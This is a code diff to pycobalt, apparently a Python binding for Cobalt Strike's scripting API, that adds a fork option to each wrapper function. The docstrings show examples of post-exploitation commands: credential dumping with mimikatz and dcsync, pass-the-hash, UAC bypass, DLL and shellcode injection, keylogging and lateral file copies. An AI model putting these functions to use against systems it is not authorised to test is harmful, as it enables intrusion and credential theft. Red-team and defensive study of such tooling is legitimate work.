@@ -21,8 +21,8 @@ import pycobalt.engine as engine
 # 	}
 # }
 # 
-def is64(*args):
-    return engine.call('-is64', args)
+def is64(*args, fork=False):
+    return engine.call('-is64', args, fork=fork)
 
 # 
 # Check if a session has admin rights
@@ -38,8 +38,8 @@ def is64(*args):
 # 	}
 # }
 # 
-def isadmin(*args):
-    return engine.call('-isadmin', args)
+def isadmin(*args, fork=False):
+    return engine.call('-isadmin', args, fork=fork)
 
 # 
 # Check if a session is a Beacon or not.
@@ -55,8 +55,8 @@ def isadmin(*args):
 # 	}
 # }
 # 
-def isbeacon(*args):
-    return engine.call('-isbeacon', args)
+def isbeacon(*args, fork=False):
+    return engine.call('-isbeacon', args, fork=fork)
 
 # 
 # Check if a session is an SSH session or not.
@@ -72,8 +72,8 @@ def isbeacon(*args):
 # 	}
 # }
 # 
-def isssh(*args):
-    return engine.call('-isssh', args)
+def isssh(*args, fork=False):
+    return engine.call('-isssh', args, fork=fork)
 
 # 
 # Post a public action message to the event log. This is similar to the /me command.
@@ -83,8 +83,8 @@ def isssh(*args):
 # 
 # action("dances!");
 # 
-def action(*args):
-    return engine.call('action', args)
+def action(*args, fork=False):
+    return engine.call('action', args, fork=fork)
 
 # 
 # create a tab to display a GUI object.
@@ -97,8 +97,8 @@ def action(*args):
 # $label = [new javax.swing.JLabel: "Hello World"];
 # addTab("Hello!", $label, "this is an example");
 # 
-def addTab(*args):
-    return engine.call('addTab', args)
+def addTab(*args, fork=False):
+    return engine.call('addTab', args, fork=fork)
 
 # 
 # Register a visualization with Cobalt Strike.
@@ -113,8 +113,8 @@ def addTab(*args):
 # See Also
 # &showVisualization
 # 
-def addVisualization(*args):
-    return engine.call('addVisualization', args)
+def addVisualization(*args, fork=False):
+    return engine.call('addVisualization', args, fork=fork)
 
 # 
 # Add text to the clipboard, notify the user.
@@ -124,8 +124,8 @@ def addVisualization(*args):
 # 
 # add_to_clipboard("Paste me you fool!");
 # 
-def add_to_clipboard(*args):
-    return engine.call('add_to_clipboard', args)
+def add_to_clipboard(*args, fork=False):
+    return engine.call('add_to_clipboard', args, fork=fork)
 
 # 
 # Creates an alias command in the Beacon console
@@ -138,8 +138,8 @@ def add_to_clipboard(*args):
 # 	btask($1, "foo!");
 # });
 # 
-def alias(*args):
-    return engine.call('alias', args)
+def alias(*args, fork=False):
+    return engine.call('alias', args, fork=fork)
 
 # 
 # Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.
@@ -149,8 +149,8 @@ def alias(*args):
 # 
 # printAll(applications());
 # 
-def applications(*args):
-    return engine.call('applications', args)
+def applications(*args, fork=False):
+    return engine.call('applications', args, fork=fork)
 
 # 
 # Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.
@@ -162,8 +162,8 @@ def applications(*args):
 # 	println("\c3( $+ $index $+ )\o $entry");
 # }
 # 
-def archives(*args):
-    return engine.call('archives', args)
+def archives(*args, fork=False):
+    return engine.call('archives', args, fork=fork)
 
 # 
 # Generates an artifact (exe, dll) from a Cobalt Strike listener
@@ -218,8 +218,8 @@ def archives(*args):
 # writeb($handle, $data);
 # closef($handle);
 # 
-def artifact(*args):
-    return engine.call('artifact', args)
+def artifact(*args, fork=False):
+    return engine.call('artifact', args, fork=fork)
 
 # 
 # Sign an EXE or DLL file
@@ -243,8 +243,8 @@ def artifact(*args):
 # writeb($handle, $data);
 # closef($handle);
 # 
-def artifact_sign(*args):
-    return engine.call('artifact_sign', args)
+def artifact_sign(*args, fork=False):
+    return engine.call('artifact_sign', args, fork=fork)
 
 # 
 # Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener
@@ -299,8 +299,8 @@ def artifact_sign(*args):
 # 
 # artifact_stageless("my listener", "exe", "x86", "", &ready);
 # 
-def artifact_stageless(*args):
-    return engine.call('artifact_stageless', args)
+def artifact_stageless(*args, fork=False):
+    return engine.call('artifact_stageless', args, fork=fork)
 
 # 
 # Unwrap a base64-encoded string
@@ -312,8 +312,8 @@ def artifact_stageless(*args):
 # 
 # println(base64_decode(base64_encode("this is a test")));
 # 
-def base64_decode(*args, silent=False):
-    return engine.call('base64_decode', args, silent=silent)
+def base64_decode(*args, silent=False, fork=False):
+    return engine.call('base64_decode', args, silent=silent, fork=fork)
 
 # 
 # Base64 encode a string
@@ -325,8 +325,8 @@ def base64_decode(*args, silent=False):
 # 
 # println(base64_encode("this is a test"));
 # 
-def base64_encode(*args, silent=False):
-    return engine.call('base64_encode', args, silent=silent)
+def base64_encode(*args, silent=False, fork=False):
+    return engine.call('base64_encode', args, silent=silent, fork=fork)
 
 # 
 # Generate the beacon browser GUI component. Shows only Beacons.
@@ -339,8 +339,8 @@ def base64_encode(*args, silent=False):
 # See Also
 # &showVisualization
 # 
-def bbrowser(*args, silent=False):
-    return engine.call('bbrowser', args, silent=silent)
+def bbrowser(*args, silent=False, fork=False):
+    return engine.call('bbrowser', args, silent=silent, fork=fork)
 
 # 
 # Start a Browser Pivot
@@ -352,8 +352,8 @@ def bbrowser(*args, silent=False):
 # 
 # bbrowserpivot($1, 1234, "x86");
 # 
-def bbrowserpivot(*args, silent=False):
-    return engine.call('bbrowserpivot', args, silent=silent)
+def bbrowserpivot(*args, silent=False, fork=False):
+    return engine.call('bbrowserpivot', args, silent=silent, fork=fork)
 
 # 
 # Stop a Browser Pivot
@@ -363,8 +363,8 @@ def bbrowserpivot(*args, silent=False):
 # 
 # bbrowserpivot_stop($1);
 # 
-def bbrowserpivot_stop(*args, silent=False):
-    return engine.call('bbrowserpivot_stop', args, silent=silent)
+def bbrowserpivot_stop(*args, silent=False, fork=False):
+    return engine.call('bbrowserpivot_stop', args, silent=silent, fork=fork)
 
 # 
 # Run the bypass UAC attack.
@@ -380,8 +380,8 @@ def bbrowserpivot_stop(*args, silent=False):
 # 	}, $bids => $1));
 # }
 # 
-def bbypassuac(*args, silent=False):
-    return engine.call('bbypassuac', args, silent=silent)
+def bbypassuac(*args, silent=False, fork=False):
+    return engine.call('bbypassuac', args, silent=silent, fork=fork)
 
 # 
 # Cancel a file download
@@ -394,8 +394,8 @@ def bbypassuac(*args, silent=False):
 # 	bcancel($1, "*");
 # }
 # 
-def bcancel(*args, silent=False):
-    return engine.call('bcancel', args, silent=silent)
+def bcancel(*args, silent=False, fork=False):
+    return engine.call('bcancel', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to change it's current working directory.
@@ -410,8 +410,8 @@ def bcancel(*args, silent=False):
 # 	bcd($1, $home);
 # }
 # 
-def bcd(*args, silent=False):
-    return engine.call('bcd', args, silent=silent)
+def bcd(*args, silent=False, fork=False):
+    return engine.call('bcd', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to checkin. This is basically a no-op for Beacon.
@@ -424,8 +424,8 @@ def bcd(*args, silent=False):
 # 	bcheckin($1);
 # }
 # 
-def bcheckin(*args, silent=False):
-    return engine.call('bcheckin', args, silent=silent)
+def bcheckin(*args, silent=False, fork=False):
+    return engine.call('bcheckin', args, silent=silent, fork=fork)
 
 # 
 # This is the "oops" command. It clears the queued tasks for the specified beacon.
@@ -435,8 +435,8 @@ def bcheckin(*args, silent=False):
 # 
 # bclear($1);
 # 
-def bclear(*args, silent=False):
-    return engine.call('bclear', args, silent=silent)
+def bclear(*args, silent=False, fork=False):
+    return engine.call('bclear', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to deploy a Covert VPN client.
@@ -449,8 +449,8 @@ def bclear(*args, silent=False):
 # 
 # bcovertvpn($1, "phear0", "172.16.48.18");
 # 
-def bcovertvpn(*args, silent=False):
-    return engine.call('bcovertvpn', args, silent=silent)
+def bcovertvpn(*args, silent=False, fork=False):
+    return engine.call('bcovertvpn', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to copy a file or folder.
@@ -462,8 +462,8 @@ def bcovertvpn(*args, silent=False):
 # 
 # bcp($1, "evil.exe", "\\\\target\\C$\\evil.exe");
 # 
-def bcp(*args, silent=False):
-    return engine.call('bcp', args, silent=silent)
+def bcp(*args, silent=False, fork=False):
+    return engine.call('bcp', args, silent=silent, fork=fork)
 
 # 
 # Get metadata for a Beacon session.
@@ -475,8 +475,8 @@ def bcp(*args, silent=False):
 # 
 # println(bdata("1234"));
 # 
-def bdata(*args, silent=False):
-    return engine.call('bdata', args, silent=silent)
+def bdata(*args, silent=False, fork=False):
+    return engine.call('bdata', args, silent=silent, fork=fork)
 
 # 
 # Use mimikatz's dcsync command to pull a user's password hash from a domain controller.
@@ -488,8 +488,8 @@ def bdata(*args, silent=False):
 # 
 # bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");
 # 
-def bdcsync(*args, silent=False):
-    return engine.call('bdcsync', args, silent=silent)
+def bdcsync(*args, silent=False, fork=False):
+    return engine.call('bdcsync', args, silent=silent, fork=fork)
 
 # 
 # Start a VNC session.
@@ -501,8 +501,8 @@ def bdcsync(*args, silent=False):
 # 	bdesktop($1);
 # }
 # 
-def bdesktop(*args, silent=False):
-    return engine.call('bdesktop', args, silent=silent)
+def bdesktop(*args, silent=False, fork=False):
+    return engine.call('bdesktop', args, silent=silent, fork=fork)
 
 # 
 # Inject a Reflective DLL into a process.
@@ -514,8 +514,8 @@ def bdesktop(*args, silent=False):
 # 
 # bdllinject($1, 1234, script_resource("test.dll"));
 # 
-def bdllinject(*args, silent=False):
-    return engine.call('bdllinject', args, silent=silent)
+def bdllinject(*args, silent=False, fork=False):
+    return engine.call('bdllinject', args, silent=silent, fork=fork)
 
 # 
 # Call LoadLibrary() in a remote process with the specified DLL.
@@ -529,8 +529,8 @@ def bdllinject(*args, silent=False):
 # 
 # bdllload($1, 1234, "c:\\windows\\mystuff.dll");
 # 
-def bdllload(*args, silent=False):
-    return engine.call('bdllload', args, silent=silent)
+def bdllload(*args, silent=False, fork=False):
+    return engine.call('bdllload', args, silent=silent, fork=fork)
 
 # 
 # Spawn a Reflective DLL as a Beacon post-exploitation job.
@@ -588,8 +588,8 @@ def bdllload(*args, silent=False):
 # 	bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000);
 # }
 # 
-def bdllspawn(*args, silent=False):
-    return engine.call('bdllspawn', args, silent=silent)
+def bdllspawn(*args, silent=False, fork=False):
+    return engine.call('bdllspawn', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to download a file
@@ -600,8 +600,8 @@ def bdllspawn(*args, silent=False):
 # 
 # bdownload($1, "c:\\sysprep.inf");
 # 
-def bdownload(*args, silent=False):
-    return engine.call('bdownload', args, silent=silent)
+def bdownload(*args, silent=False, fork=False):
+    return engine.call('bdownload', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to list the drives on the compromised system
@@ -614,8 +614,8 @@ def bdownload(*args, silent=False):
 # 	bdrives($1);
 # }
 # 
-def bdrives(*args, silent=False):
-    return engine.call('bdrives', args, silent=silent)
+def bdrives(*args, silent=False, fork=False):
+    return engine.call('bdrives', args, silent=silent, fork=fork)
 
 # 
 # Describe a Beacon command.
@@ -627,8 +627,8 @@ def bdrives(*args, silent=False):
 # 
 # println(beacon_command_describe("ls"));
 # 
-def beacon_command_describe(*args, silent=False):
-    return engine.call('beacon_command_describe', args, silent=silent)
+def beacon_command_describe(*args, silent=False, fork=False):
+    return engine.call('beacon_command_describe', args, silent=silent, fork=fork)
 
 # 
 # Get the help information for a Beacon command.
@@ -640,8 +640,8 @@ def beacon_command_describe(*args, silent=False):
 # 
 # println(beacon_command_detail("ls"));
 # 
-def beacon_command_detail(*args, silent=False):
-    return engine.call('beacon_command_detail', args, silent=silent)
+def beacon_command_detail(*args, silent=False, fork=False):
+    return engine.call('beacon_command_detail', args, silent=silent, fork=fork)
 
 # 
 # Register help information for a Beacon command.
@@ -660,8 +660,8 @@ def beacon_command_detail(*args, silent=False):
 # 	"echo text to beacon log",
 # 	"Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
 # 
-def beacon_command_register(*args, silent=False):
-    return engine.call('beacon_command_register', args, silent=silent)
+def beacon_command_register(*args, silent=False, fork=False):
+    return engine.call('beacon_command_register', args, silent=silent, fork=fork)
 
 # 
 # Get a list of Beacon commands.
@@ -671,8 +671,8 @@ def beacon_command_register(*args, silent=False):
 # 
 # printAll(beacon_commands());
 # 
-def beacon_commands(*args, silent=False):
-    return engine.call('beacon_commands', args, silent=silent)
+def beacon_commands(*args, silent=False, fork=False):
+    return engine.call('beacon_commands', args, silent=silent, fork=fork)
 
 # 
 # Get metadata for a Beacon session.
@@ -684,8 +684,8 @@ def beacon_commands(*args, silent=False):
 # 
 # println(beacon_data("1234"));
 # 
-def beacon_data(*args, silent=False):
-    return engine.call('beacon_data', args, silent=silent)
+def beacon_data(*args, silent=False, fork=False):
+    return engine.call('beacon_data', args, silent=silent, fork=fork)
 
 # 
 # Run a command and report its output to the user.
@@ -708,8 +708,8 @@ def beacon_data(*args, silent=False):
 # 	beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
 # }
 # 
-def beacon_execute_job(*args, silent=False):
-    return engine.call('beacon_execute_job', args, silent=silent)
+def beacon_execute_job(*args, silent=False, fork=False):
+    return engine.call('beacon_execute_job', args, silent=silent, fork=fork)
 
 # 
 # Describe a Beacon exploit
@@ -723,8 +723,8 @@ def beacon_execute_job(*args, silent=False):
 # 
 # See Also
 # &beacon_exploit_register, &beacon_exploits, &belevate
-def beacon_exploit_describe(*args, silent=False):
-    return engine.call('beacon_exploit_describe', args, silent=silent)
+def beacon_exploit_describe(*args, silent=False, fork=False):
+    return engine.call('beacon_exploit_describe', args, silent=silent, fork=fork)
 
 # 
 # Register a Beacon privilege escalation exploit with Cobalt Strike
@@ -762,8 +762,8 @@ def beacon_exploit_describe(*args, silent=False):
 # See Also
 # &beacon_exploit_describe, &beacon_exploits, &belevate
 # 
-def beacon_exploit_register(*args, silent=False):
-    return engine.call('beacon_exploit_register', args, silent=silent)
+def beacon_exploit_register(*args, silent=False, fork=False):
+    return engine.call('beacon_exploit_register', args, silent=silent, fork=fork)
 
 # 
 # Get a list of privilege escalation exploits registered with Cobalt Strike.
@@ -776,8 +776,8 @@ def beacon_exploit_register(*args, silent=False):
 # See also
 # &beacon_exploit_describe, &beacon_exploit_register, &belevate
 # 
-def beacon_exploits(*args, silent=False):
-    return engine.call('beacon_exploits', args, silent=silent)
+def beacon_exploits(*args, silent=False, fork=False):
+    return engine.call('beacon_exploits', args, silent=silent, fork=fork)
 
 # 
 # Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.
@@ -807,8 +807,8 @@ def beacon_exploits(*args, silent=False):
 # 	beacon_execute_job($1, "powershell", $cmd, 1);
 # }
 # 
-def beacon_host_imported_script(*args, silent=False):
-    return engine.call('beacon_host_imported_script', args, silent=silent)
+def beacon_host_imported_script(*args, silent=False, fork=False):
+    return engine.call('beacon_host_imported_script', args, silent=silent, fork=fork)
 
 # 
 # Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.
@@ -828,8 +828,8 @@ def beacon_host_imported_script(*args, silent=False):
 # 	bpowerpick($1, $hosted);
 # }
 # 
-def beacon_host_script(*args, silent=False):
-    return engine.call('beacon_host_script', args, silent=silent)
+def beacon_host_script(*args, silent=False, fork=False):
+    return engine.call('beacon_host_script', args, silent=silent, fork=fork)
 
 # 
 # Get the ID of all Beacons calling back to this Cobalt Strike team server.
@@ -841,8 +841,8 @@ def beacon_host_script(*args, silent=False):
 # 	println("Bid: $bid");
 # }
 # 
-def beacon_ids(*args, silent=False):
-    return engine.call('beacon_ids', args, silent=silent)
+def beacon_ids(*args, silent=False, fork=False):
+    return engine.call('beacon_ids', args, silent=silent, fork=fork)
 
 # 
 # Get information from a Beacon session's metadata.
@@ -856,15 +856,15 @@ def beacon_ids(*args, silent=False):
 # println("User is: " . beacon_info("1234", "user"));
 # println("PID  is: " . beacon_info("1234", "pid"));
 # 
-def beacon_info(*args, silent=False):
-    return engine.call('beacon_info', args, silent=silent)
+def beacon_info(*args, silent=False, fork=False):
+    return engine.call('beacon_info', args, silent=silent, fork=fork)
 
 # 
 # Remove a Beacon from the display.
 # Arguments
 # $1 - the id for the beacon to remove
-def beacon_remove(*args, silent=False):
-    return engine.call('beacon_remove', args, silent=silent)
+def beacon_remove(*args, silent=False, fork=False):
+    return engine.call('beacon_remove', args, silent=silent, fork=fork)
 
 # 
 # Get information about all Beacons calling back to this Cobalt Strike team server.
@@ -876,8 +876,8 @@ def beacon_remove(*args, silent=False):
 # 	println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
 # }
 # 
-def beacons(*args, silent=False):
-    return engine.call('beacons', args, silent=silent)
+def beacons(*args, silent=False, fork=False):
+    return engine.call('beacons', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to elevate with a memory corruption exploit.
@@ -897,8 +897,8 @@ def beacons(*args, silent=False):
 # See Also
 # &beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits
 # 
-def belevate(*args, silent=False):
-    return engine.call('belevate', args, silent=silent)
+def belevate(*args, silent=False, fork=False):
+    return engine.call('belevate', args, silent=silent, fork=fork)
 
 # 
 # Publish an error message to the Beacon transcript
@@ -911,8 +911,8 @@ def belevate(*args, silent=False):
 # 	berror($1, "You should never run this command!");
 # }
 # 
-def berror(*args, silent=False):
-    return engine.call('berror', args, silent=silent)
+def berror(*args, silent=False, fork=False):
+    return engine.call('berror', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to execute a command [without a shell]. This provides no output to the user.
@@ -923,8 +923,8 @@ def berror(*args, silent=False):
 # 
 # bexecute($1, "notepad.exe");
 # 
-def bexecute(*args, silent=False):
-    return engine.call('bexecute', args, silent=silent)
+def bexecute(*args, silent=False, fork=False):
+    return engine.call('bexecute', args, silent=silent, fork=fork)
 
 # 
 # Spawns a local .NET executable assembly as a Beacon post-exploitation job.
@@ -944,8 +944,8 @@ def bexecute(*args, silent=False):
 # 	bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
 # }
 # 
-def bexecute_assembly(*args, silent=False):
-    return engine.call('bexecute_assembly', args, silent=silent)
+def bexecute_assembly(*args, silent=False, fork=False):
+    return engine.call('bexecute_assembly', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to exit.
@@ -958,8 +958,8 @@ def bexecute_assembly(*args, silent=False):
 # 	bexit($1);
 # }
 # 
-def bexit(*args, silent=False):
-    return engine.call('bexit', args, silent=silent)
+def bexit(*args, silent=False, fork=False):
+    return engine.call('bexit', args, silent=silent, fork=fork)
 
 # 
 # Attempts to enable the specified privilege in your Beacon session.
@@ -973,8 +973,8 @@ def bexit(*args, silent=False):
 # 	bgetprivs($1, "SeDebugPriv");
 # }
 # 
-def bgetprivs(*args, silent=False):
-    return engine.call('bgetprivs', args, silent=silent)
+def bgetprivs(*args, silent=False, fork=False):
+    return engine.call('bgetprivs', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to attempt to get the SYSTEM token.
@@ -987,8 +987,8 @@ def bgetprivs(*args, silent=False):
 # 	bgetsystem($1);
 # }
 # 
-def bgetsystem(*args, silent=False):
-    return engine.call('bgetsystem', args, silent=silent)
+def bgetsystem(*args, silent=False, fork=False):
+    return engine.call('bgetsystem', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to print the User ID of the current token
@@ -997,8 +997,8 @@ def bgetsystem(*args, silent=False):
 # 
 # bgetuid($1);
 # 
-def bgetuid(*args, silent=False):
-    return engine.call('bgetuid', args, silent=silent)
+def bgetuid(*args, silent=False, fork=False):
+    return engine.call('bgetuid', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to dump local account password hashes.
@@ -1011,8 +1011,8 @@ def bgetuid(*args, silent=False):
 # 	bhashdump($1);
 # }
 # 
-def bhashdump(*args, silent=False):
-    return engine.call('bhashdump', args, silent=silent)
+def bhashdump(*args, silent=False, fork=False):
+    return engine.call('bhashdump', args, silent=silent, fork=fork)
 
 # 
 # Get information from a Beacon session's metadata.
@@ -1026,8 +1026,8 @@ def bhashdump(*args, silent=False):
 # println("User is: " . binfo("1234", "user"));
 # println("PID  is: " . binfo("1234", "pid"));
 # 
-def binfo(*args, silent=False):
-    return engine.call('binfo', args, silent=silent)
+def binfo(*args, silent=False, fork=False):
+    return engine.call('binfo', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to inject a session into a specific process
@@ -1040,8 +1040,8 @@ def binfo(*args, silent=False):
 # 
 # binject($1, 1234, "my listener");
 # 
-def binject(*args, silent=False):
-    return engine.call('binject', args, silent=silent)
+def binject(*args, silent=False, fork=False):
+    return engine.call('binject', args, silent=silent, fork=fork)
 
 # 
 # Inject shellcode into a process.
@@ -1054,8 +1054,8 @@ def binject(*args, silent=False):
 # 
 # binjectsh($1, 1234, "x86", script_resource("test.bin"));
 # 
-def binjectsh(*args, silent=False):
-    return engine.call('binjectsh', args, silent=silent)
+def binjectsh(*args, silent=False, fork=False):
+    return engine.call('binjectsh', args, silent=silent, fork=fork)
 
 # 
 # Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.
@@ -1067,8 +1067,8 @@ def binjectsh(*args, silent=False):
 # # indicate the user ran the ls command
 # binput($1, "ls");
 # 
-def binput(*args, silent=False):
-    return engine.call('binput', args, silent=silent)
+def binput(*args, silent=False, fork=False):
+    return engine.call('binput', args, silent=silent, fork=fork)
 
 # 
 # Task a Beacon to list network interfaces.
@@ -1083,8 +1083,8 @@ def binput(*args, silent=False):
 # 	});
 # }
 # 
-def bipconfig(*args, silent=False):
-    return engine.call('bipconfig', args, silent=silent)
+def bipconfig(*args, silent=False, fork=False):
+    return engine.call('bipconfig', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to kill a running post-exploitation job
@@ -1095,8 +1095,8 @@ def bipconfig(*args, silent=False):
 # 
 # bjobkill($1, 0);
 # 
-def bjobkill(*args, silent=False):
-    return engine.call('bjobkill', args, silent=silent)
+def bjobkill(*args, silent=False, fork=False):
+    return engine.call('bjobkill', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to list running post-exploitation jobs.
@@ -1106,8 +1106,8 @@ def bjobkill(*args, silent=False):
 # 
 # bjobs($1);
 # 
-def bjobs(*args, silent=False):
-    return engine.call('bjobs', args, silent=silent)
+def bjobs(*args, silent=False, fork=False):
+    return engine.call('bjobs', args, silent=silent, fork=fork)
 
 # 
 # Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray
@@ -1120,8 +1120,8 @@ def bjobs(*args, silent=False):
 # 	bkerberos_ccache_use($1, $2);
 # }
 # 
-def bkerberos_ccache_use(*args, silent=False):
-    return engine.call('bkerberos_ccache_use', args, silent=silent)
+def bkerberos_ccache_use(*args, silent=False, fork=False):
+    return engine.call('bkerberos_ccache_use', args, silent=silent, fork=fork)
 
 # 
 # Ask beacon to purge tickets from the user's kerberos tray
@@ -1133,8 +1133,8 @@ def bkerberos_ccache_use(*args, silent=False):
 # 	bkerberos_ticket_purge($1);
 # }
 # 
-def bkerberos_ticket_purge(*args, silent=False):
-    return engine.call('bkerberos_ticket_purge', args, silent=silent)
+def bkerberos_ticket_purge(*args, silent=False, fork=False):
+    return engine.call('bkerberos_ticket_purge', args, silent=silent, fork=fork)
 
 # 
 # Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray
@@ -1147,8 +1147,8 @@ def bkerberos_ticket_purge(*args, silent=False):
 # 	bkerberos_ticket_use($1, $2);
 # }
 # 
-def bkerberos_ticket_use(*args, silent=False):
-    return engine.call('bkerberos_ticket_use', args, silent=silent)
+def bkerberos_ticket_use(*args, silent=False, fork=False):
+    return engine.call('bkerberos_ticket_use', args, silent=silent, fork=fork)
 
 # 
 # Injects a keystroke logger into a process.
@@ -1160,8 +1160,8 @@ def bkerberos_ticket_use(*args, silent=False):
 # 
 # bkeylogger($1, 1234, "x64");
 # 
-def bkeylogger(*args, silent=False):
-    return engine.call('bkeylogger', args, silent=silent)
+def bkeylogger(*args, silent=False, fork=False):
+    return engine.call('bkeylogger', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to kill a process
@@ -1172,8 +1172,8 @@ def bkeylogger(*args, silent=False):
 # 
 # bkill($1, 1234);
 # 
-def bkill(*args, silent=False):
-    return engine.call('bkill', args, silent=silent)
+def bkill(*args, silent=False, fork=False):
+    return engine.call('bkill', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to link to a host over a named pipe
@@ -1184,8 +1184,8 @@ def bkill(*args, silent=False):
 # 
 # blink($1, "DC");
 # 
-def blink(*args, silent=False):
-    return engine.call('blink', args, silent=silent)
+def blink(*args, silent=False, fork=False):
+    return engine.call('blink', args, silent=silent, fork=fork)
 
 # 
 # Post a message to WordPress.com (just kidding). Publishes an output message to the Beacon transcript.
@@ -1198,8 +1198,8 @@ def blink(*args, silent=False):
 # 	blog($1, "I am output for the blog function");
 # }
 # 
-def blog(*args, silent=False):
-    return engine.call('blog', args, silent=silent)
+def blog(*args, silent=False, fork=False):
+    return engine.call('blog', args, silent=silent, fork=fork)
 
 # 
 # Publishes an output message to the Beacon transcript. This function has an alternate format from &blog
@@ -1212,8 +1212,8 @@ def blog(*args, silent=False):
 # 	blog2($1, "I am output for the blog2 function");
 # }
 # 
-def blog2(*args, silent=False):
-    return engine.call('blog2', args, silent=silent)
+def blog2(*args, silent=False, fork=False):
+    return engine.call('blog2', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to create a token from the specified credentials. This is the make_token command.
@@ -1231,8 +1231,8 @@ def blog2(*args, silent=False):
 # 	bloginuser($1, $domain, $user, "");
 # }
 # 
-def bloginuser(*args, silent=False):
-    return engine.call('bloginuser', args, silent=silent)
+def bloginuser(*args, silent=False, fork=False):
+    return engine.call('bloginuser', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to dump in-memory credentials with mimikatz
@@ -1245,8 +1245,8 @@ def bloginuser(*args, silent=False):
 # 	blogonpasswords($1);
 # }
 # 
-def blogonpasswords(*args, silent=False):
-    return engine.call('blogonpasswords', args, silent=silent)
+def blogonpasswords(*args, silent=False, fork=False):
+    return engine.call('blogonpasswords', args, silent=silent, fork=fork)
 
 # 
 # Task a Beacon to list files
@@ -1269,8 +1269,8 @@ def blogonpasswords(*args, silent=False):
 # 	bls($1, ".");
 # }
 # 
-def bls(*args, silent=False):
-    return engine.call('bls', args, silent=silent)
+def bls(*args, silent=False, fork=False):
+    return engine.call('bls', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a mimikatz command.
@@ -1283,8 +1283,8 @@ def bls(*args, silent=False):
 # 	bmimikatz($1, "standard::coffee");
 # }
 # 
-def bmimikatz(*args, silent=False):
-    return engine.call('bmimikatz', args, silent=silent)
+def bmimikatz(*args, silent=False, fork=False):
+    return engine.call('bmimikatz', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to make a directory
@@ -1295,8 +1295,8 @@ def bmimikatz(*args, silent=False):
 # 
 # bmkdir($1, "you are owned");
 # 
-def bmkdir(*args, silent=False):
-    return engine.call('bmkdir', args, silent=silent)
+def bmkdir(*args, silent=False, fork=False):
+    return engine.call('bmkdir', args, silent=silent, fork=fork)
 
 # 
 # Change the data channel for a DNS Beacon.
@@ -1310,8 +1310,8 @@ def bmkdir(*args, silent=False):
 # 	bmode($1, "dns-txt");
 # }
 # 
-def bmode(*args, silent=False):
-    return engine.call('bmode', args, silent=silent)
+def bmode(*args, silent=False, fork=False):
+    return engine.call('bmode', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to move a file or folder.
@@ -1323,8 +1323,8 @@ def bmode(*args, silent=False):
 # 
 # bmv($1, "evil.exe", "\\\\target\\\C$\\evil.exe");
 # 
-def bmv(*args, silent=False):
-    return engine.call('bmv', args, silent=silent)
+def bmv(*args, silent=False, fork=False):
+    return engine.call('bmv', args, silent=silent, fork=fork)
 
 # 
 # Run a command from Beacon's net module.
@@ -1391,8 +1391,8 @@ def bmv(*args, silent=False):
 # 	bnet($1, "localgroup", $2, "administrators");
 # }
 # 
-def bnet(*args, silent=False):
-    return engine.call('bnet', args, silent=silent)
+def bnet(*args, silent=False, fork=False):
+    return engine.call('bnet', args, silent=silent, fork=fork)
 
 # 
 # Assign a note to the specified Beacon.
@@ -1403,8 +1403,8 @@ def bnet(*args, silent=False):
 # 
 # bnote($1, "foo");
 # 
-def bnote(*args, silent=False):
-    return engine.call('bnote', args, silent=silent)
+def bnote(*args, silent=False, fork=False):
+    return engine.call('bnote', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.
@@ -1417,8 +1417,8 @@ def bnote(*args, silent=False):
 # 
 # bpassthehash($1, "GLITTER", "Administrator", $hash);
 # 
-def bpassthehash(*args, silent=False):
-    return engine.call('bpassthehash', args, silent=silent)
+def bpassthehash(*args, silent=False, fork=False):
+    return engine.call('bpassthehash', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to pause its execution. This is a one-off sleep.
@@ -1431,8 +1431,8 @@ def bpassthehash(*args, silent=False):
 # 	bpause($1, int($2));
 # }
 # 
-def bpause(*args, silent=False):
-    return engine.call('bpause', args, silent=silent)
+def bpause(*args, silent=False, fork=False):
+    return engine.call('bpause', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run its port scanner.
@@ -1446,8 +1446,8 @@ def bpause(*args, silent=False):
 # 
 # bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);
 # 
-def bportscan(*args, silent=False):
-    return engine.call('bportscan', args, silent=silent)
+def bportscan(*args, silent=False, fork=False):
